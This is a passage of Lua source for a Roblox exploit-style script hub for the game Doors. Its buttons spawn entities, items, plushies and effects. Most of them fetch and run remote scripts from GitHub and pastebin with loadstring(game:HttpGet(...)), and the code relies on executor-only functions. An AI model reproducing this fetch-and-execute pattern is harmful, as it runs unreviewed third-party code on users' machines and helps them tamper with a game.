DEVELOPER NOTE:
By overwriting 'CrucifixionOverwrite' the default crucifixion callback will be replaced with your custom callback.

entity:SetCallback("CrucifixionOverwrite", function()
    print("Custom crucifixion callback")
end)

]]--

		---====== Run entity ======---

		entity:Run()
	end
})


Tab:AddButton({
	Name = "Pandemonium",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))();
	end    
})




Tab:AddButton({
	Name = "Timothy",
	Callback = function()
		while true do
			wait(0.35)
			local a = game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game
			require(a.RemoteListener.Modules.SpiderJumpscare)(require(a), workspace.CurrentRooms["0"].Assets.Dresser.DrawerContainer, 0.2)
		end
	end

})

Tab:AddButton({
	Name = "Screech",
	Callback = function()
		while true do 
			wait(0.35)
			require(game.StarterGui.MainUI.Initiator.Main_Game.RemoteListener.Modules.Screech)(require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game),
				workspace.CurrentRooms[game.Players.LocalPlayer:GetAttribute("CurrentRoom")])
		end
	end
})

Tab:AddButton({
	Name = "Halt",
	Callback = function()
		while true do 
			wait(0.35)
			require(game.ReplicatedStorage.ClientModules.EntityModules.Shade).stuff(require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game),
				workspace.CurrentRooms[game.Players.LocalPlayer:GetAttribute("CurrentRoom")])
		end
	end
})





Tab:AddButton({
	Name = "FE Jack Spawner ( WORKS SOMETIMES :/ )",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/hyay9T8n'))()
	end    
})



Tab:AddButton({
	Name = "Seek Eyes (PRESS M)",
	Callback = function()
		local UIS=game:GetService'UserInputService'
		getgenv().KeyBind="M" --change "Q" to whatever button you press to spawn Seek Eyes

		UIS.InputBegan:Connect(function(Key)
			if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind] and not UIS:GetFocusedTextBox() then

				local a = game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game
				require(game.ReplicatedStorage.ClientModules.EntityModules.Seek).tease(nil, workspace.CurrentRooms[game.Players.LocalPlayer:GetAttribute("CurrentRoom")], 100)
			end
		end)
	end

})




Tab:AddButton({
	Name = "Chill Seek",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Idk-lol2/chill-seek/refs/heads/main/chillseklal.Pl.txt"))()
	end    
})


Tab:AddButton({
	Name = "Immortal Snail",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAcceleration/Comet-Development/refs/heads/main/Doors/Game/Immortal%20Snail.lua"))()
	end

})



Tab:AddButton({
	Name = "Custom Entity Spawner",
	Callback = function()
		---====== Load spawner ======---

		local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Entity%20Spawner/V2/Source.lua"))()

		---====== Create entity ======---

		local entity = spawner.Create({
			Entity = {
				Name = "Template Entity",
				Asset = "https://github.com/RegularVynixu/Utilities/raw/main/Doors/Entity%20Spawner/Assets/Entities/Ambush.rbxm",
				HeightOffset = 0
			},
			Lights = {
				Flicker = {
					Enabled = true,
					Duration = 5
				},
				Shatter = true,
				Repair = false
			},
			Earthquake = {
				Enabled = false
			},
			CameraShake = {
				Enabled = true,
				Range = 1000,
				Values = {10, 10, 12, 10} -- Magnitude, Roughness, FadeIn, FadeOut
			},
			Movement = {
				Speed = 200,
				Delay = 2,
				Reversed = false
			},
			Rebounding = {
				Enabled = true,
				Type = "Ambush", -- "Blitz"
				Min = 1,
				Max = 1,
				Delay = 2
			},
			Damage = {
				Enabled = false,
				Range = 40,
				Amount = 125
			},
			Crucifixion = {
				Enabled = true,
				Range = 40,
				Resist = false,
				Break = true
			},
			Death = {
				Type = "Guiding", -- "Curious"
				Hints = {"Death", "Hints", "Go", "Here"},
				Cause = ""
			}
		})

		---====== Debug entity ======---

		entity:SetCallback("OnSpawned", function()
			print("Entity has spawned")
		end)

		entity:SetCallback("OnStartMoving", function()
			print("Entity has started moving")
		end)

		entity:SetCallback("OnEnterRoom", function(room, firstTime)
			if firstTime == true then
				print("Entity has entered room: ".. room.Name.. " for the first time")
			else
				print("Entity has entered room: ".. room.Name.. " again")
			end
		end)

		entity:SetCallback("OnLookAt", function(lineOfSight)
			if lineOfSight == true then
				print("Player is looking at entity")
			else
				print("Player view is obstructed by something")
			end
		end)

		entity:SetCallback("OnRebounding", function(startOfRebound)
			if startOfRebound == true then
				print("Entity has started rebounding")
			else
				print("Entity has finished rebounding")
			end
		end)

		entity:SetCallback("OnDespawning", function()
			print("Entity is despawning")
		end)

		entity:SetCallback("OnDespawned", function()
			print("Entity has despawned")
		end)

		entity:SetCallback("OnDamagePlayer", function(newHealth)
			if newHealth == 0 then
				print("Entity has killed the player")
			else
				print("Entity has damaged the player")
			end
		end)

--[[

DEVELOPER NOTE:
By overwriting 'CrucifixionOverwrite' the default crucifixion callback will be replaced with your custom callback.

entity:SetCallback("CrucifixionOverwrite", function()
    print("Custom crucifixion callback")
end)

]]--

		---====== Run entity ======---

		entity:Run()
	end
})




local Section = Tab:AddSection({
	Name = "Morphs"
})


Tab:AddButton({
	Name = "Chrono Entity Morph",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))();
	end

})




local Section = Tab:AddSection({
	Name = "Behavior Packs"
})


Tab:AddButton({
	Name = "MiniMap",
	Callback = function()
		-- settings
		local MINIMAP_SIZE = 0.12
		local MINIMAP_SCALE = 500
		local MINIMAP_PADDING = 12

		local ELEMENT_BORDER = 1
		-- script
		local RunService = game:GetService("RunService")
		local Player = game:GetService("Players").LocalPlayer
		local CurrentRooms = workspace:WaitForChild("CurrentRooms")

		local ScreenGui = Instance.new("ScreenGui")
		ScreenGui.Name = "Minimap"
		ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
		ScreenGui.Parent = Player.PlayerGui

		local MinimapFrame = Instance.new("Frame")
		MinimapFrame.Size = UDim2.fromScale(MINIMAP_SIZE, MINIMAP_SIZE)
		MinimapFrame.SizeConstraint = Enum.SizeConstraint.RelativeXX
		MinimapFrame.AnchorPoint = Vector2.new(0, 1)
		MinimapFrame.Position = UDim2.new(0, MINIMAP_PADDING, 1, -MINIMAP_PADDING)
		MinimapFrame.BackgroundColor3 = Color3.new()
		MinimapFrame.ClipsDescendants = true
		MinimapFrame.ZIndex = -1
		MinimapFrame.Parent = ScreenGui

		local ElementHolder = Instance.new("Frame")
		ElementHolder.BackgroundTransparency = 1
		ElementHolder.Size = UDim2.fromScale(1, 1)
		ElementHolder.Position = UDim2.fromScale(0.5, 0.5)
		ElementHolder.AnchorPoint = Vector2.new(0.5, 0.5)
		ElementHolder.ZIndex = 0
		ElementHolder.Parent = MinimapFrame

		local Arrow = Instance.new("ImageLabel")
		Arrow.Size = UDim2.fromScale(0.07, 0.09)
		Arrow.Position = UDim2.fromScale(0.5, 0.5)
		Arrow.AnchorPoint = Vector2.new(0.5, 0.5)
		Arrow.BackgroundTransparency = 1
		Arrow.Image = "rbxassetid://13069495837"
		Arrow.ZIndex = 12345
		Arrow.Parent = MinimapFrame

		local function AddPartToMap(Part: BasePart, Color: Color3, ZIndex: number, SizeOverride: UDim2?)
			local Frame = Instance.new("Frame")
			Frame.Size = SizeOverride or UDim2.new(Part.Size.X / MINIMAP_SCALE, -ELEMENT_BORDER * 2, Part.Size.Z / MINIMAP_SCALE, -ELEMENT_BORDER * 2)
			Frame.Position = UDim2.fromScale(Part.Position.X / MINIMAP_SCALE + 0.5, Part.Position.Z / MINIMAP_SCALE + 0.5)
			Frame.AnchorPoint = Vector2.new(0.5, 0.5)
			Frame.BackgroundColor3 = Color3.new()
			Frame.BorderColor3 = Color
			Frame.BorderSizePixel = ELEMENT_BORDER
			Frame.ZIndex = ZIndex + 2
			Frame.Rotation = Part.Rotation.Y
			Frame.Parent = ElementHolder
		end

		local function AddRoomToMap(Room: Model)
			for _, Part in pairs(Room:GetChildren()) do
				if not Part:IsA("BasePart") then continue end

				if Part.CollisionGroup == "BaseCheck" then
					AddPartToMap(Part, Color3.new(0, 0.85, 0), 0)
				elseif Part == Room.PrimaryPart then
					AddPartToMap(Part, Color3.new(0.85, 0, 0), 1, UDim2.fromScale(8 / MINIMAP_SCALE, 8 / MINIMAP_SCALE))
				end
			end
		end

		for _, Room in pairs(CurrentRooms:GetChildren()) do
			AddRoomToMap(Room)
		end

		CurrentRooms.ChildAdded:Connect(function(NewRoom)
			repeat
				task.wait()
			until NewRoom:FindFirstChild("RoomEntrance") and NewRoom:FindFirstChild(NewRoom.Name)

			AddRoomToMap(NewRoom)
		end)

		RunService.RenderStepped:Connect(function()
			local Character = Player.Character; if not Character then return end
			local Root = Character:FindFirstChild("Collision"); if not Root then return end
			local LookVector = workspace.CurrentCamera.CFrame.LookVector
			local Rotation = math.atan2(LookVector.X, LookVector.Z)

			ElementHolder.Position = UDim2.fromScale(0.5 - Root.Position.X / MINIMAP_SCALE, 0.5 - Root.Position.Z / MINIMAP_SCALE)
			Arrow.Rotation = -math.deg(Rotation) + 180
		end)
	end    
})






Tab:AddButton({
	Name = "666",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/cokroache/Cokroaches-FattyHub/refs/heads/main/fattyscarymode")()
		)	
	end
	
})

Tab:AddButton({
	Name = "666 Entities",
	Callback = function()
		OrionLib:MakeNotification({
			Name = "666 Entities Spawner CMDS:",
			Content = "Z,X,V,B,N",
			Image = "rbxassetid://107642772703957",
			Time = 7
		})
		
		loadstring(game:HttpGet("https://raw.githubusercontent.com/cokroache/Cokroaches-FattyHub/refs/heads/main/ssecond")()
			
		)
	end    

})






Tab:AddButton({
	Name = "Week (FLOOR 1 / FLOOR 2 SECOND CHASE)",
	Callback = function()

		local seek = game.workspace:WaitForChild("SeekMovingNewClone")
		local seekbody = seek:WaitForChild("SeekRig")

		seekbody.Head.Color = Color3.fromRGB(255,255,255)
		seekbody.LeftLowerArm.Color = Color3.fromRGB(255,255,255)
		seekbody.LeftLowerLeg.Color = Color3.fromRGB(255,255,255)
		seekbody.LeftUpperArm.Color = Color3.fromRGB(255,255,255)
		seekbody.LeftUpperLeg.Color = Color3.fromRGB(255,255,255)
		seekbody.LowerTorso.Color = Color3.fromRGB(255,255,255)
		seekbody.RightLowerArm.Color = Color3.fromRGB(255,255,255)
		seekbody.RightLowerLeg.Color = Color3.fromRGB(255,255,255)
		seekbody.RightUpperArm.Color = Color3.fromRGB(255,255,255)
		seekbody.RightUpperLeg.Color = Color3.fromRGB(255,255,255)
		seekbody.SeekPuddle.Color = Color3.fromRGB(255,255,255)
		seekbody.UpperTorso.Color = Color3.fromRGB(255,255,255)
		seekbody.Head.Black.Color = Color3.fromRGB(255,255,255)

	end    
})



Tab:AddButton({
	Name = "Week (FLOOR2)",
	Callback = function()
		local seek = game.workspace:WaitForChild("SeekMovingNewClone")
		local seekbody = seek:WaitForChild("SeekRig")

		seekbody.Head.Color = Color3.fromRGB(255,255,255)
		seekbody.LeftLowerArm.Color = Color3.fromRGB(255,255,255)
		seekbody.LeftLowerLeg.Color = Color3.fromRGB(255,255,255)
		seekbody.LeftUpperArm.Color = Color3.fromRGB(255,255,255)
		seekbody.LeftUpperLeg.Color = Color3.fromRGB(255,255,255)
		seekbody.LowerTorso.Color = Color3.fromRGB(255,255,255)
		seekbody.RightLowerArm.Color = Color3.fromRGB(255,255,255)
		seekbody.RightLowerLeg.Color = Color3.fromRGB(255,255,255)
		seekbody.RightUpperArm.Color = Color3.fromRGB(255,255,255)
		seekbody.RightUpperLeg.Color = Color3.fromRGB(255,255,255)
		seekbody.SeekPuddle.Color = Color3.fromRGB(255,255,255)
		seekbody.UpperTorso.Color = Color3.fromRGB(255,255,255)
		seekbody.Head.Black.Color = Color3.fromRGB(255,255,255)

		--floor 2
		local CurrentRooms = game.Workspace:WaitForChild("CurrentRooms")
		local Door = CurrentRooms:WaitForChild("42")
		local drip = Door:WaitForChild("_SeekCutscene")

		drip.SlimeDrip1.Color = Color3.fromRGB(255,255,255)
		drip.SlimeDrip2.Color = Color3.fromRGB(255,255,255)


	end    
})


Tab:AddButton({
	Name = "Floor is Lava",
	Callback = function()
		_G.DEBUG_LAVA = false
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAcceleration/Comet-Development/refs/heads/main/Doors/Game/FloorIsLava.lua"))()
	end

})



Tab:AddButton({
	Name = "Custom Rooms (HOTEL-)",
	Callback = function()
--[[
		CONFIGURATION:
			_G.CUSTOMROOMMODEL = NUMBER ID (Replace with your own room model if you'd like)
				_G.CUSTOMROOMDOOR = NUMBER ID (Replace door with your own door model if you'd like)
					_G.CUSTOMCRATELOADSTRING = LOADSTRING URL (STRING) (Replace crate interaction loadstring if you'd like)
						_G.CUSTOMCRATEDIALOGUE = STRING OF TEXT "Hello!" (Replace crate dialogue on interaction if you'd like)

							--]]

		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAcceleration/Comet-Development/refs/heads/main/Doors/Game/CustomRooms/Storage.lua"))()
	end    
})


Tab:AddButton({
	Name = "Devils Room",
	Callback = function()
		--game:GetService("ReplicatedStorage").Bricks.PlayAgain:FireServer()


		function MakeDoor(Point)
			local Model = game:GetObjects("rbxassetid://11782334073")[1]
			Model.Parent = Point.Parent
			Model:SetPrimaryPartCFrame(Point.CFrame * CFrame.new(0, 0, .5))

			local Prompt = Model.Knob.PromptAtt.DoorOpen

			local function Open()
				Prompt.Enabled = false



				task.spawn(function()
					local knobC1 = Model.Hinge.Knob.C1

					--Eye glow

					for _,v in pairs(Model.Skull:GetChildren()) do
						if string.match(v.Name,"Eye") then
							game:GetService("TweenService"):Create(v, TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
								Color = Color3.fromRGB(91, 163, 71),
							}):Play()
						end
					end

					game:GetService("TweenService"):Create(Model.Hinge.Knob, TweenInfo.new(0.5, Enum.EasingStyle.Back), {C1 = knobC1 * CFrame.Angles(0, 0, math.rad(-35))}):Play()
					task.wait(.5)
					Model.Door.CanCollide = false
					Model.Door.Open:Play()
					firesignal(game.ReplicatedStorage.Bricks.Caption.OnClientEvent, "You force the door open")
					Model.Hidden:Destroy()

					for _,v in pairs(Model.Skull:GetChildren()) do
						if string.match(v.Name,"Eye") then
							game:GetService("TweenService"):Create(v, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
								Color = Color3.fromRGB(0, 0, 0),
							}):Play()
						end
					end

					game:GetService("TweenService"):Create(Model.Hinge.Knob, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.InOut), {C1 = knobC1}):Play()

					game:GetService("TweenService"):Create(Model.Hinge, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.InOut), {CFrame = Model.Hinge.CFrame * CFrame.Angles(0, math.rad(-90), 0)}):Play()
				end)



			end


			Prompt.Triggered:Connect(Open)
			print("Room Spawned!")

			wait(1)

			workspace.CurrentRooms.SixSixSix.QDR.Animated.Crucifix.DevilsCrucifix.Prompt.Triggered:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/CometV4/main/Items/Devil'sCrucifix.lua",true))()
				firesignal(game.ReplicatedStorage.Bricks.Caption.OnClientEvent, "You grabbed the bloody crucifix...")
			end)

		end



		function ReturnLatestRoom()
			return workspace.CurrentRooms:FindFirstChild(game.ReplicatedStorage.GameData.LatestRoom.Value)
		end

		function FixRoomPoint(Point)
			if Point:IsA("BasePart") then
				Point.Size = Vector3.new(5, 8, 0.5)
				Point.Orientation += Vector3.new(0,180,0)
				Point.CFrame *= CFrame.new(0,0,-1)
				Point.Name = "PointRoomFix"

				return Point
			end
		end

		function GenerateTheSkeletonAppears(Point)
			local Room = game:GetObjects("rbxassetid://11790629185")[1]
			Room.Parent = workspace.CurrentRooms
			Room.Name = "SixSixSix"
			Room:SetPrimaryPartCFrame(Point.CFrame)

			GetNearestPlankedDoor(Point.Parent.Parent,Point)

			MakeDoor(Point)

		end

		function GetNearestPlankedDoor(Room,Point)
			for _,v in pairs(Room:GetDescendants()) do
				if v.Name == "FakeDoor_Hotel" then
					local dist = (Point.Position - v.FakeDoor.Position).Magnitude

					if dist < 5 then
						for _,z in pairs(v:GetDescendants()) do
							if z:IsA("BasePart") then
								z.Transparency = 1
								z.CanCollide = false
							end
						end
					end

				end
			end

		end


		function CheckRoom(Room)
			if Room:FindFirstChild("RandomDoor") then
				local Doors = Room:FindFirstChild("RandomDoor"):GetChildren()

				if #Doors > 1 then
					local ChosenPoint = Doors[math.random(1,#Doors)]

					local NewPoint = FixRoomPoint(ChosenPoint)
					GenerateTheSkeletonAppears(NewPoint)
				else

					local NewPoint = FixRoomPoint(Doors[1])
					GenerateTheSkeletonAppears(NewPoint)
				end

			end
		end

		game.ReplicatedStorage.GameData.LatestRoom.Changed:Connect(function()
			task.wait(.1)
			CheckRoom(ReturnLatestRoom())
		end)

	end    
})


local Section = Tab:AddSection({
	Name = "Lobby"
})


Tab:AddButton({
	Name = "Lobby Lights Flicker",
	Callback = function()
		_G.CDebug = false -- Set to true to enable debug messages
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAcceleration/Comet-Development/refs/heads/main/Doors/Lobby/FlickerLobbyLights.lua"))()
	end    
})



local Tab = Window:MakeTab({
	Name = "> Doors Items",
	Icon = "rbxassetid://0",
	PremiumOnly = false
})



local Section = Tab:AddSection({
	Name = "Bottles"
})


Tab:AddButton({
	Name = "Bottle of MoonLight",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/IdkMyNameLoll/04d7dd5e02688624b958b8c2604b924c/raw/9e86b34249f44ed2dd433176e67daaf3db30cde8/MoonBottle'))() 
	end    
})


Tab:AddButton({
	Name = "Bottle of SpiralLight",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/IdkMyNameLoll/8b05c837bea9effac2554340465b4be1/raw/3f3be0ee72e7f153db39a16a40fa63dce6cde72d/SpiralBottle'))()
	end    
})

Tab:AddButton({
	Name = "Bottle of StarGuggle",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/refs/heads/main/StarJug.lua"))()
	end    
})


local Section = Tab:AddSection({
	Name = "Tablets"
})



Tab:AddButton({
	Name = "Tablet in Rift",
	Callback = function()
		-- TABLET SCRIPT BY COKROACHE

		local function TheTablet()
			_G.scanner_fps = 30
			_G.disable_static = false
			loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/main/Scanner.lua"))()
		end


		local Table =  workspace.CurrentRooms[game.ReplicatedStorage.GameData.LatestRoom.Value]:FindFirstChild("Desk_Bell", true)
		local RiftCFrame = Table.Base.CFrame
		local model = game:GetObjects("rbxassetid://12500938429")[1]
		model.Parent = workspace.CurrentRooms[game.ReplicatedStorage.GameData.LatestRoom.Value]
		model:PivotTo(RiftCFrame)

		model.Center.Prompt.Triggered:Connect(function()
			local Rift = model.Center
			model.Center.Prompt.Enabled = false

			task.spawn(function() 
				_G.OnShop = true

				loadstring(game:HttpGet('https://raw.githubusercontent.com/DeividComSono/Scripts/main/Scanner.lua'))()
				TheTablet()
			end)

			for _,v in pairs(Rift.ParticlesIn:GetChildren()) do
				v.Enabled = false
			end

			for _,v in pairs(Rift:GetDescendants()) do
				if v:IsA("Sound") then
					v.Volume = 0
				end
			end

			for _,v in pairs(Rift:GetDescendants()) do
				if v:IsA("Light") then
					v.Enabled = false
				end
			end

			Rift.ItemHolder.Item.Enabled = false
			Rift.Parent.Rift.Transparency = 1

			Rift.ParticlesOut.Core:Emit(5)
			Rift.ParticlesOut.Explosion:Emit(1)
			Rift.ParticlesOut.RiftLines2:Emit(1)
			Rift.ParticlesOut.RiftLines:Emit(1)
			Rift.ParticlesOut.Triangles:Emit(5)
			Rift.ParticlesOut.ZoomParticle:Emit(5)
			task.wait()
			TheTablet()
		end)
	end    
})




Tab:AddButton({
	Name = "Scanner",
	Callback = function()
		_G.scanner_fps = 120
		_G.disable_static = false
		loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/main/Scanner.lua"))()
	end    
})


Tab:AddButton({
	Name = "Gold iPad",
	Callback = function()
		_G.scanner_fps = 120
		_G.disable_static = false
		loadstring(game:HttpGet("https://pastebin.com/raw/umRteEPy"))()
	end
})

Tab:AddButton({
	Name = "Purple iPad",
	Callback = function()
		_G.scanner_fps = 120
		_G.disable_static = false
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Agadigas/Doors/refs/heads/main/Glitched%20Scanner%20by%20Custom%20Doors"))()
	end    
})


Tab:AddButton({
	Name = "Grass iPad",
	Callback = function()
		_G.scanner_fps = 120
		_G.disable_static = false
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Matthew201322/Doors-Scriptee/refs/heads/main/grass%20tablet.lua"))()
	end    
})


local Section = Tab:AddSection({
	Name = "Crucifixes"
})




Tab:AddButton({
	Name = "Inf Crucifix on Everything",
	Callback = function()
		--inf cruc
		---====== Load module ======---

		local module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/refs/heads/main/Doors/Crucifix%20Everything/Source.lua"))()

		---====== Create crucifix ======---

		module.GiveCrucifix({
			Type = 1,
			Uses = nil, -- nil : infinite uses
			Resist = false,
			EntitiesOnly = false, -- true : custom entities only
			IgnoreList = {}
		})

--[[

CRUCIFIX TYPES:
-> 1: Guiding Light


COMING SOON:
-> Curious Light crucifix type

]]--





	end    
})








local Section = Tab:AddSection({
	Name = "Bombs"
})


Tab:AddButton({
	Name = "Holy Hand Grenade",
	Callback = function()

		loadstring(game:HttpGet("https://pastebin.com/raw/x0YVrBkd", true))()
	end    
})


Tab:AddButton({
	Name = "Grenade",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/zeFBYYy9", true))()
	end    
})




local Section = Tab:AddSection({
	Name = "Dolls"
})




Tab:AddButton({
	Name = "Rush Doll",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://72025883311382")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})


Tab:AddButton({
	Name = "Ambush Doll",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://129406418315786")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})

Tab:AddButton({
	Name = "Action 'Figure'",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://121628672556065")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})

Tab:AddButton({
	Name = "Door",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://133913591697836")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})



local Section = Tab:AddSection({
	Name = "Plushies"
})


Tab:AddButton({
	Name = "Ambush Plush",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://71987918381147")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})


Tab:AddButton({
	Name = "Seek Plush",
	Callback = function()
		-- seek plush
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")

		local plush = game:GetObjects("rbxassetid://13613269677")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})






Tab:AddButton({
	Name = "Screech Plush",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://76674867809939")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})


Tab:AddButton({
	Name = "Giggle Plush",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://114602114775268")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})

Tab:AddButton({
	Name = "Grumble Plush",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://108874685564391")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})



Tab:AddButton({
	Name = "Figure Plush",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://91952805079733")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})




Tab:AddButton({
	Name = "Jeff Plush",
	Callback = function()
		local tool = game:GetObjects("rbxassetid://13069619857")[1]
		tool.Parent = game.Players.LocalPlayer.Backpack
	end    
})






Tab:AddButton({
	Name = "Dread Plush",
	Callback = function()
		-- seek plush
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")

		local plush = game:GetObjects("rbxassetid://12554352475")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)

	end    
})



local Section = Tab:AddSection({
	Name = "ShakeLights"
})



Tab:AddButton({
	Name = "Golden ShakeLight",
	Callback = function()
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/aadyian9000/the-thing/main/GoldenGummyFlashlight.lua"),true))() 
	end    
})

Tab:AddButton({
	Name = "Blue ShakeLight",
	Callback = function()
		--bluye light

		local Curious = 'https://github.com/Matthew201322/Doors-Scriptee/blob/Shakelights/Curious%20Shakelight.rbxm?raw=true'
		local Grassful_Flashlight = 'https://github.com/Matthew201322/Doors-Scriptee/blob/Shakelights/Grassful%20Flashlight.rbxm?raw=true'
		local Grassful_Shakelight = 'https://github.com/Matthew201322/Doors-Scriptee/blob/Shakelights/Grassful%20Shakelight.rbxm?raw=true'
		local Guiding = 'https://github.com/Matthew201322/Doors-Scriptee/blob/main/Guiding%20Shakelight.rbxm?raw=true'
		local Mischievous = 'https://github.com/Matthew201322/Doors-Scriptee/blob/Shakelights/Mischievous%20Shakelight.rbxm?raw=true'
		local Wooden = 'https://github.com/Matthew201322/Doors-Scriptee/blob/Shakelights/Wooden%20Shakelight.rbxm?raw=true'

		-- the shakelights omg

		_G.Model = Guiding
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Matthew201322/Doors-Scriptee/refs/heads/main/Shakelight.luau", true))()
	end    
})

local Section = Tab:AddSection({
	Name = "Custom Items"
})

local CustomID = "0"


Tab:AddButton({
	Name = "Custom Item",
	Callback = function()
		local tool = game:GetObjects("rbxassetid://" .. CustomID)[1]
		tool.Parent = game.Players.LocalPlayer.Backpack
	end      
})


Tab:AddTextbox({
	Name = "Item ID",
	Default = "0",
	TextDisappear = true,
	Callback = function(Value)
		CustomID = Value
	end	  
})


local ShopIDItem = "11397433017"
local PriceId = "999"
local StockID = "1"


Tab:AddButton({
	Name = "Custom Shop Items",
	Callback = function()
--[[

    NOTE: Custom shop items will NOT cost any real knobs

]]--

		local Functions = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Functions.lua"))()
